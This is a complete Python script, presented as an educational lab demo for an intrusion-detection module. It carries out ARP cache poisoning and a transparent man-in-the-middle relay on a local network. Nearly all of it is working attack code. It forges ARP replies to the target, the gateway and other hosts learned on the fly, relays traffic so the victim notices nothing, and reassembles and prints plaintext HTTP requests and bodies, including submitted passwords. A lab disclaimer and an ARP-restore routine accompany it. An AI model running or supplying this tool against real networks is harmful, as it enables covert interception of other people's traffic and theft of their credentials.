#!/usr/bin/env python3
"""
ARP-spoof + transparent relay  (pure Python, standard library only)

EDUCATIONAL LAB USE ONLY
------------------------
This is a demo for the IDS module. Only run it on a network you own or on a
lab network where you have explicit written permission. Intercepting other
people's traffic without authorization is illegal.

What it teaches
---------------
1. Build Ether net + ARP frames by hand with `struct` (no Scapy).
2. Poison ARP caches so the victims route through us:
       target -> "gateway is at <attacker MAC>"
       gateway -> "target is at <attacker MAC>"
   Extra LAN hosts (e.g. a web server on :5000) are poisoned as well, either
   because they are listed in EXTRA_UPSTREAMS or because we learn them from
   the target's own ARP requests/replies.
3. Relay every frame addressed to us at layer 2, so nothing breaks.
   IPv4 *and* IPv6 are relayed.
4. Reassemble TCP streams and print complete HTTP headers + bodies.

WHERE IS THE WEB SERVER?
------------------------
The tool now handles all three lab layouts:

  a) server on the gateway            -> normal gateway poisoning
  b) server on another LAN host       -> add its IP to EXTRA_UPSTREAMS, or
                                         let the target's ARP request teach us
  c) server on THIS machine (attacker) -> target talks straight to our IP; we
                                         print it as "client -> server (local)"
                                         and let the kernel deliver it

Only *plaintext* HTTP can be read.  TLS / QUIC on 443 is encrypted; you will
see its size, never a password.  The demo must use an http:// URL on a
filtered port (5000 by default).

Linux only: AF_PACKET raw sockets are required.  Run as root.
"""

import fcntl
import os
import signal
import socket
import struct
import sys
import threading
import time

# ---------------------------------------------------------------------------
# LAB CONFIGURATION
# ---------------------------------------------------------------------------
IFACE = os.environ.get("IFACE", "wlp2s0")

TARGET_IP = "10.110.233.222"
# Set to None to ARP-resolve it live (phones rotate randomized MACs).
TARGET_MAC = "aa:bb:25:b4:f7:a9"
KNOWN_TARGET_MAC = "aa:bb:25:b4:f7:a9"

GATEWAY_IP = "10.110.233.187"
GATEWAY_MAC = None            # None -> resolve with ARP

# Web server is a separate host on the same LAN?  Put its IP here.
# Leave empty if the server is the gateway or this machine.
# Same-subnet hosts are NOT routed through the gateway, so they must be
# poisoned explicitly (or learned live from the target's ARP requests).
EXTRA_UPSTREAMS = ["10.110.233.36"]

ATTACKER_MAC = None           # None -> read from IFACE

POISON_INTERVAL = 1.0         # seconds between poisoning frames

# ---- DISPLAY FILTER (this NEVER affects relaying) -------------------------
# Print only packets whose source or destination is this IP.
# None -> print traffic from every host that happens to transit us.
FILTER_IP = TARGET_IP

# Print only packets that use at least one of these ports.
# None -> print every port (you will be flooded by TLS/QUIC on 443).
FILTER_PORTS = {5000, 80, 8000, 8080, 8888}

# Hex-dump non-HTTP payloads.  Keep False for a readable demo.
VERBOSE = False

MAX_STREAM = 1 << 20          # cap per-TCP-stream reassembly buffer
# ---------------------------------------------------------------------------

ETH_P_ALL  = 0x0003
ETH_P_IP   = 0x0800
ETH_P_IPV6 = 0x86DD
ETH_P_ARP  = 0x0806

ARP_REQUEST = 1
ARP_REPLY   = 2

BROADCAST = b"\xff" * 6

HTTP_METHODS = (b"GET", b"POST", b"PUT", b"DELETE", b"HEAD",
                b"OPTIONS", b"PATCH", b"TRACE", b"CONNECT")

# Ports whose TCP payload we try to reassemble as HTTP.
# FILTER_PORTS is unioned in at runtime, so a new demo port works even if
# you forget to edit this set.
HTTP_PORTS = {80, 5000, 8000, 8080, 8888}


# ----------------------------- small helpers -------------------------------
def mac_bytes(mac: str) -> bytes:
    """'dc:0e:a1:35:99:b9' -> b'\\xdc\\x0e...'"""
    return bytes(int(part, 16) for part in mac.replace("-", ":").split(":"))


def mac_str(raw: bytes) -> str:
    return ":".join("%02x" % b for b in raw)


def ip_bytes(ip: str) -> bytes:
    return socket.inet_aton(ip)


def iface_mac(ifname: str) -> str:
    """Read the hardware address of an interface (SIOCGIFHWADDR)."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        info = fcntl.ioctl(
            s.fileno(), 0x8927, struct.pack("256s", ifname[:15].encode())
        )
    return mac_str(info[18:24])


def iface_ip(ifname: str) -> str:
    """Read the IPv4 address of an interface (SIOCGIFADDR)."""
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        info = fcntl.ioctl(
            s.fileno(), 0x8915, struct.pack("256s", ifname[:15].encode())
        )
    return socket.inet_ntoa(info[20:24])


def iface_netmask(ifname: str) -> str:
    """Read the IPv4 netmask of an interface (SIOCGIFNETMASK)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            info = fcntl.ioctl(
                s.fileno(), 0x891b, struct.pack("256s", ifname[:15].encode())
            )
        return socket.inet_ntoa(info[20:24])
    except OSError:
        return "255.255.255.0"


def same_subnet(ip_a: str, ip_b: str, netmask: str) -> bool:
    a = struct.unpack("!I", socket.inet_aton(ip_a))[0]
    b = struct.unpack("!I", socket.inet_aton(ip_b))[0]
    m = struct.unpack("!I", socket.inet_aton(netmask))[0]
    return (a & m) == (b & m)


def local_ipv4_addresses() -> set:
    """Every IPv4 address of this machine, so a local server is recognised
    even when it binds to a secondary address or another interface."""
    ips = {"127.0.0.1"}
    for _, name in socket.if_nameindex():
        try:
            ips.add(iface_ip(name))
        except OSError:
            pass
    return ips


# --------------------------- frame construction ----------------------------
def build_arp(op: int, sha: bytes, spa: bytes, tha: bytes, tpa: bytes) -> bytes:
    """
    Ethernet(14) + ARP(28) frame.

        Ethernet: dst(6) src(6) ethertype(2)=0x0806
        ARP     : htype(2)=1 ptype(2)=0x0800 hlen(1)=6 plen(1)=4
                  oper(2) sha(6) spa(4) tha(6) tpa(4)
    """
    ethernet = tha + sha + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack("!HHBBH", 1, ETH_P_IP, 6, 4, op)
    arp += sha + spa + tha + tpa
    return ethernet + arp


def open_arp_socket(ifname: str) -> socket.socket:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                      socket.htons(ETH_P_ARP))
    s.bind((ifname, 0))
    return s


def resolve_mac(ifname: str, ip: str, timeout: float = 3.0) -> str:
    """Find the MAC that currently answers for `ip`, using a hand-built ARP."""
    me_mac = mac_bytes(iface_mac(ifname))
    me_ip = ip_bytes(iface_ip(ifname))
    request = build_arp(ARP_REQUEST, me_mac, me_ip, BROADCAST, ip_bytes(ip))

    sock = open_arp_socket(ifname)
    sock.settimeout(0.2)
    try:
        sock.send(request)
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                frame, _ = sock.recvfrom(2048)
            except socket.timeout:
                sock.send(request)
                continue
            if len(frame) < 42:
                continue
            oper = struct.unpack("!H", frame[20:22])[0]
            sender_ip = frame[28:32]
            if oper == ARP_REPLY and sender_ip == ip_bytes(ip):
                return mac_str(frame[22:28])
    finally:
        sock.close()
    raise RuntimeError("Could not resolve MAC for %s" % ip)


# ------------------------------- poisoning ---------------------------------
class Poisoner(threading.Thread):
    """Keep telling one victim that a foreign IP lives at our MAC."""

    def __init__(self, ifname, attacker_mac, spoof_ip, victim_mac,
                 victim_ip, stop):
        super().__init__(daemon=True)
        self.ifname = ifname
        self.attacker_mac = attacker_mac
        self.spoof_ip = spoof_ip
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.stop = stop

    def run(self):
        frame = build_arp(ARP_REPLY, self.attacker_mac, ip_bytes(self.spoof_ip),
                          self.victim_mac, ip_bytes(self.victim_ip))
        sock = open_arp_socket(self.ifname)
        try:
            while not self.stop.is_set():
                try:
                    sock.send(frame)
                except OSError:
                    pass
                self.stop.wait(POISON_INTERVAL)   # sleep, wake on Ctrl+C
        finally:
            sock.close()


class PoisonSet:
    """
    The set of remote hosts we intercept for the target.

    For every host IP we run two poisoners:
        target  <- "host IP is at attacker MAC"
        host    <- "target IP is at attacker MAC"
    Hosts can be added at startup (gateway + EXTRA_UPSTREAMS) or learned live
    from the target's broadcast ARP requests.
    """

    def __init__(self, ifname, attacker_mac, target_ip, target_mac, stop):
        self.ifname = ifname
        self.attacker_mac = attacker_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.stop = stop
        self.lock = threading.Lock()
        self.macs = {}          # upstream IP -> MAC bytes
        self.threads = []
        self.learning = set()

    def add(self, ip: str, mac: bytes, quiet: bool = False) -> None:
        with self.lock:
            if ip in self.macs:
                return
            self.macs[ip] = mac
            new_threads = [
                Poisoner(self.ifname, self.attacker_mac, ip,
                         self.target_mac, self.target_ip, self.stop),
                Poisoner(self.ifname, self.attacker_mac, self.target_ip,
                         mac, ip, self.stop),
            ]
            self.threads.extend(new_threads)
        for thread in new_threads:
            thread.start()
        if not quiet:
            print("[+] intercepting %s (%s)" % (ip, mac_str(mac)))

    def mac_for(self, ip: str):
        with self.lock:
            return self.macs.get(ip)

    def ips(self):
        with self.lock:
            return list(self.macs)

    def items(self):
        with self.lock:
            return list(self.macs.items())

    def learn(self, ip: str) -> None:
        """Discover a LAN host from an ARP request and start intercepting it."""
        with self.lock:
            if ip in self.macs or ip in self.learning:
                return
            self.learning.add(ip)

        def work():
            try:
                mac = mac_bytes(resolve_mac(self.ifname, ip, timeout=1.5))
            except RuntimeError:
                with self.lock:
                    self.learning.discard(ip)
                return
            self.add(ip, mac)
            with self.lock:
                self.learning.discard(ip)

        threading.Thread(target=work, daemon=True).start()

    def stop_all(self) -> None:
        self.stop.set()
        for thread in self.threads:
            thread.join(timeout=2.0)


def restore(ifname: str, target_mac: bytes, target_ip: str,
            upstreams, rounds: int = 5) -> None:
    """Put the real MAC/IP bindings back so the network heals."""
    sock = open_arp_socket(ifname)
    try:
        for _ in range(rounds):
            for ip, mac in upstreams:
                # tell the target the real MAC of this host
                sock.send(build_arp(ARP_REPLY, mac, ip_bytes(ip),
                                    target_mac, ip_bytes(target_ip)))
                # tell the host the real MAC of the target
                sock.send(build_arp(ARP_REPLY, target_mac,
                                    ip_bytes(target_ip), mac, ip_bytes(ip)))
            time.sleep(0.2)
    finally:
        sock.close()


# --------------------------- payload inspection ----------------------------
def hexdump(data: bytes, limit: int = 768) -> str:
    """Hex + ASCII dump, really truncated at `limit` bytes."""
    view = data[:limit]
    out = []
    for offset in range(0, len(view), 16):
        chunk = view[offset:offset + 16]
        hx = " ".join("%02x" % b for b in chunk).ljust(47)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append("    %04x  %s  %s" % (offset, hx, asc))
    if len(data) > limit:
        out.append("    ... (%d bytes total, showing first %d)"
                   % (len(data), limit))
    return "\n".join(out)


def is_http_start(data: bytes) -> bool:
    if not data:
        return False
    if data.startswith(b"HTTP/"):
        return True
    return data.split(b" ", 1)[0] in HTTP_METHODS


def http_ports():
    """Ports we treat as HTTP candidates: the built-ins plus your filter."""
    if FILTER_PORTS is None:
        return HTTP_PORTS
    return HTTP_PORTS | set(FILTER_PORTS)


class HttpReassembler:
    """
    Glue TCP segments back together so a split HTTP message prints once.

    One buffer per 4-tuple (src, sport, dst, dport).  Sequence numbers are
    used to ignore retransmissions and to recover from small gaps.
    """

    def __init__(self):
        self.streams = {}          # key -> [next_seq, bytearray]

    def has(self, key) -> bool:
        return key in self.streams

    def feed(self, key, seq: int, data: bytes):
        """
        Add a TCP segment.  Returns:
            None        -> pure retransmission, nothing new to show
            []          -> new bytes buffered but no complete message yet
            [messages]  -> one or more complete HTTP messages
        """
        state = self.streams.get(key)
        if state is None:
            state = [seq, bytearray()]
            self.streams[key] = state

        next_seq, buf = state
        if seq == next_seq:
            buf.extend(data)
            state[0] = next_seq + len(data)
        elif seq < next_seq:
            overlap = next_seq - seq
            if overlap >= len(data):
                return None                     # pure retransmission
            buf.extend(data[overlap:])
            state[0] = next_seq + len(data) - overlap
        else:
            # We missed a segment.  Start this stream over from here rather
            # than concatenating garbage.
            del buf[:]
            buf.extend(data)
            state[0] = seq + len(data)

        if len(buf) > MAX_STREAM:
            del buf[:len(buf) - MAX_STREAM]

        messages = []
        while True:
            message = self._take_one(buf)
            if message is None:
                break
            if message == "garbage":
                continue
            messages.append(message)
        return messages

    @staticmethod
    def _take_one(buf):
        sep = buf.find(b"\r\n\r\n")
        if sep < 0:
            return None

        head = bytes(buf[:sep])
        first = head.split(b"\r\n", 1)[0]
        is_request = first.split(b" ", 1)[0] in HTTP_METHODS
        is_response = first.startswith(b"HTTP/")
        if not (is_request or is_response):
            del buf[:sep + 4]                   # not HTTP: drop the block
            return "garbage"

        content_length = None
        for line in head.split(b"\r\n")[1:]:
            if line.lower().startswith(b"content-length:"):
                try:
                    content_length = int(line.split(b":", 1)[1].strip())
                except ValueError:
                    content_length = None
                break

        if content_length is None:
            # Requests have no body without Content-Length.  For responses
            # (chunked / close-delimited) we cannot find the end, so show
            # the headers and move on.
            content_length = 0
            if is_response:
                del buf[:sep + 4]
                return ("response", head, b"", None)

        total = sep + 4 + content_length
        if len(buf) < total:
            return None                          # wait for more segments

        body = bytes(buf[sep + 4:total])
        del buf[:total]
        return ("request" if is_request else "response",
                head, body, content_length)


def print_http(kind: str, head: bytes, body: bytes, content_length) -> None:
    side = "REQUEST" if kind == "request" else "RESPONSE"
    print("    ===== HTTP %s HEADERS =====" % side)
    for line in head.split(b"\r\n"):
        print("    " + line.decode("latin-1", "replace"))
    print("    ===== HTTP %s BODY (%d bytes%s) ====="
          % (side, len(body),
             "" if content_length is None
             else ", Content-Length=%d" % content_length))
    if body:
        print(hexdump(body))
    else:
        print("    (no body)")


def handle_ipv4(frame: bytes, direction: str,
                assembler: HttpReassembler) -> bool:
    """Display one IPv4 packet if it passes the display filter.

    Returns True when something was printed, False when the packet was hidden
    (so the relay loop can report that it is still alive).
    """
    ip = frame[14:]
    if len(ip) < 20 or (ip[0] >> 4) != 4:
        return False
    ihl = (ip[0] & 0x0F) * 4
    if ihl < 20 or len(ip) < ihl:
        return False
    frag = struct.unpack("!H", ip[6:8])[0]
    if frag & 0x1FFF:                     # non-first fragment: no L4 header
        return False

    total = min(struct.unpack("!H", ip[2:4])[0], len(ip))
    proto = ip[9]
    src = socket.inet_ntoa(ip[12:16])
    dst = socket.inet_ntoa(ip[16:20])

    if FILTER_IP is not None and FILTER_IP not in (src, dst):
        return False

    seg = ip[ihl:total]
    key = seq = None
    sport = dport = None

    if proto == 6:                                    # TCP
        if len(seg) < 20:
            return False
        sport, dport = struct.unpack("!HH", seg[0:4])
        data_offset = (seg[12] >> 4) * 4
        if data_offset < 20 or len(seg) < data_offset:
            return False
        data = seg[data_offset:]
        seq = struct.unpack("!I", seg[4:8])[0]
        key = (src, sport, dst, dport)
        label = "TCP  %s:%d -> %s:%d" % (src, sport, dst, dport)
    elif proto == 17:                                 # UDP
        if len(seg) < 8:
            return False
        sport, dport = struct.unpack("!HH", seg[0:4])
        data = seg[8:]
        label = "UDP  %s:%d -> %s:%d" % (src, sport, dst, dport)
    elif proto == 1:                                  # ICMP
        if len(seg) < 4:
            return False
        data = seg[4:]
        label = "ICMP %s -> %s" % (src, dst)
    else:
        return False

    if not data:
        return False                                  # pure ACK / keep-alive

    if FILTER_PORTS is not None:
        if sport is None or not ({sport, dport} & FILTER_PORTS):
            return False

    candidates = http_ports()
    http_flow = (proto == 6 and
                 (assembler.has(key) or sport in candidates
                  or dport in candidates or is_http_start(data)))

    messages = None
    if http_flow:
        messages = assembler.feed(key, seq, data)
        if messages is None:
            return False                              # pure retransmission

    print("\n[%s] %-22s %s  (%d bytes)"
          % (time.strftime("%H:%M:%S"), direction, label, len(data)))

    if http_flow:
        if messages:
            for kind, head, body, content_length in messages:
                print_http(kind, head, body, content_length)
        else:
            print("    (partial HTTP segment buffered, waiting for more)")
        return True

    if VERBOSE:
        print(hexdump(data))
    else:
        preview = data[:60].decode("latin-1", "replace")
        preview = "".join(c if 32 <= ord(c) < 127 else "." for c in preview)
        print("    %s%s" % (preview, " ..." if len(data) > 60 else ""))
    return True


# ------------------------------- relaying ----------------------------------
def learn_from_arp(frame: bytes, poison_set: PoisonSet, own_ip: str,
                   own_ips: set, own_mask: str, target_ip: str,
                   target_mac: bytes) -> None:
    """
    If the target broadcasts "who has X?", it is about to talk to X directly.
    Poison that pair too, otherwise same-subnet traffic bypasses us.
    """
    if len(frame) < 42:
        return
    oper = struct.unpack("!H", frame[20:22])[0]
    if oper not in (ARP_REQUEST, ARP_REPLY):
        return
    sender_mac = frame[22:28]
    sender_ip = socket.inet_ntoa(frame[28:32])
    peer_ip = socket.inet_ntoa(frame[38:42])   # "who has X?" / requester of reply

    if sender_mac != target_mac and sender_ip != target_ip:
        return
    if peer_ip in ("0.0.0.0", "255.255.255.255", target_ip):
        return
    if peer_ip in own_ips:
        return
    if not same_subnet(peer_ip, own_ip, own_mask):
        return
    poison_set.learn(peer_ip)


def run_relay(sock, ifname, attacker_mac, target_ip, target_mac, gateway_mac,
              poison_set: PoisonSet, stop):
    """
    Relay every frame addressed to us and print the interesting ones.

    Order matters:
      1. learn from the target's ARP requests,
      2. relay (unfiltered, so the victim never notices),
      3. display (filtered).
    """
    own_ip = iface_ip(ifname)
    own_ips = local_ipv4_addresses()
    own_mask = iface_netmask(ifname)
    assembler = HttpReassembler()
    relayed = target_seen = 0
    last_report = time.time()

    while not stop.is_set():
        if time.time() - last_report >= 10.0:
            print("[*] %s  relayed %d, target frames %d, hosts: %s"
                  % (time.strftime("%H:%M:%S"), relayed, target_seen,
                     ", ".join(poison_set.ips()) or "-"))
            if target_seen == 0:
                print("    [!] no frame from/for the target yet. Check that")
                print("        the target is online and its MAC is %s."
                      % mac_str(target_mac))
            last_report = time.time()

        try:
            frame, _ = sock.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            break

        if len(frame) < 14:
            continue

        ethertype = struct.unpack("!H", frame[12:14])[0]

        # --- learn same-subnet peers from the target's ARP requests ---------
        if ethertype == ETH_P_ARP:
            learn_from_arp(frame, poison_set, own_ip, own_ips, own_mask,
                           target_ip, target_mac)
            continue

        if frame[0:6] != attacker_mac:
            continue                                  # not addressed to us
        if ethertype not in (ETH_P_IP, ETH_P_IPV6):
            continue

        direction = None
        dest_mac = None

        if ethertype == ETH_P_IP:
            ip = frame[14:]
            if len(ip) < 20 or (ip[0] >> 4) != 4:
                continue
            ip_src = socket.inet_ntoa(ip[12:16])
            ip_dst = socket.inet_ntoa(ip[16:20])

            if ip_src == target_ip or ip_dst == target_ip:
                target_seen += 1

            # (a) target -> a web server running ON THIS MACHINE.
            #     Show it; the kernel delivers it to the local server.
            #     Do NOT relay it (it is not transit traffic).
            if ip_dst in own_ips:
                if ip_src == target_ip:
                    try:
                        handle_ipv4(frame, "client -> server (local)",
                                    assembler)
                    except Exception as exc:
                        if VERBOSE:
                            print("[!] parse error: %s" % exc)
                continue

            if ip_src == target_ip:
                direction = "client -> server"
                dest_mac = poison_set.mac_for(ip_dst) or gateway_mac
            elif ip_dst == target_ip:
                direction = "server -> client"
                dest_mac = target_mac
            elif frame[6:12] == gateway_mac:
                direction = "server -> client"
                dest_mac = poison_set.mac_for(ip_dst)
                if dest_mac is None:
                    poison_set.learn(ip_dst)          # unknown client
                    continue
            else:
                direction = "client -> server"
                dest_mac = gateway_mac
        else:
            # IPv6: single-target lab, so gateway -> us means "to the target".
            if frame[6:12] == gateway_mac:
                direction = "server -> client"
                dest_mac = target_mac
            else:
                direction = "client -> server"
                dest_mac = gateway_mac

        if dest_mac is None:
            continue

        out = dest_mac + attacker_mac + frame[12:]
        try:
            sock.send(out)
        except OSError:
            pass
        relayed += 1

        if ethertype == ETH_P_IP:
            try:
                handle_ipv4(frame, direction, assembler)
            except Exception as exc:                  # never die on bad packet
                if VERBOSE:
                    print("[!] parse error: %s" % exc)


# --------------------------------- main ------------------------------------
def main():
    if os.geteuid() != 0:
        sys.exit("Raw sockets need root: run with sudo.")

    attacker_mac = mac_bytes(ATTACKER_MAC) if ATTACKER_MAC \
        else mac_bytes(iface_mac(IFACE))

    if TARGET_MAC:
        target_mac = mac_bytes(TARGET_MAC)
    else:
        print("[*] resolving target %s ..." % TARGET_IP)
        try:
            target_mac = mac_bytes(resolve_mac(IFACE, TARGET_IP))
        except RuntimeError:
            print("[!] target did not answer ARP, using known MAC %s"
                  % KNOWN_TARGET_MAC)
            target_mac = mac_bytes(KNOWN_TARGET_MAC)

    if GATEWAY_MAC:
        gateway_mac = mac_bytes(GATEWAY_MAC)
    else:
        print("[*] resolving gateway %s ..." % GATEWAY_IP)
        gateway_mac = mac_bytes(resolve_mac(IFACE, GATEWAY_IP))

    stop = threading.Event()
    poison_set = PoisonSet(IFACE, attacker_mac, TARGET_IP, target_mac, stop)
    poison_set.add(GATEWAY_IP, gateway_mac)

    for ip in EXTRA_UPSTREAMS:
        try:
            mac = mac_bytes(resolve_mac(IFACE, ip))
        except RuntimeError:
            print("[!] cannot resolve %s, skipping" % ip)
            continue
        poison_set.add(ip, mac)

    own_ip = iface_ip(IFACE)
    print("[*] interface    : %s" % IFACE)
    print("[*] attacker MAC : %s" % mac_str(attacker_mac))
    print("[*] target       : %s  (%s)" % (TARGET_IP, mac_str(target_mac)))
    print("[*] gateway      : %s  (%s)" % (GATEWAY_IP, mac_str(gateway_mac)))
    print("[*] this machine : %s" % own_ip)
    print("[*] display filter: IP=%s  ports=%s  (relay is unfiltered)"
          % (FILTER_IP,
             "all" if FILTER_PORTS is None else
             ",".join(str(p) for p in sorted(FILTER_PORTS))))
    print("[*] web server on this machine? POSTs show as 'client -> server (local)'.")
    print("[*] web server on another LAN host? add it to EXTRA_UPSTREAMS")
    print("    (or wait for the target's ARP request and it is learned live).")
    print("[*] note: only plaintext HTTP is readable; 443 is encrypted.")
    print("[*] poisoning ARP caches, relaying traffic. Ctrl+C to stop.\n")

    relay_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                               socket.htons(ETH_P_ALL))
    relay_sock.bind((IFACE, 0))
    relay_sock.settimeout(1.0)
    try:
        relay_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 20)
    except OSError:
        pass

    def on_signal(signum, _frame):
        stop.set()

    signal.signal(signal.SIGINT, on_signal)
    signal.signal(signal.SIGTERM, on_signal)

    try:
        run_relay(relay_sock, IFACE, attacker_mac, TARGET_IP, target_mac,
                  gateway_mac, poison_set, stop)
    finally:
        stop.set()
        poison_set.stop_all()
        print("\n[*] restoring ARP tables ...")
        restore(IFACE, target_mac, TARGET_IP, poison_set.items())
        relay_sock.close()
        print("[*] done.")


if __name__ == "__main__":
    main()
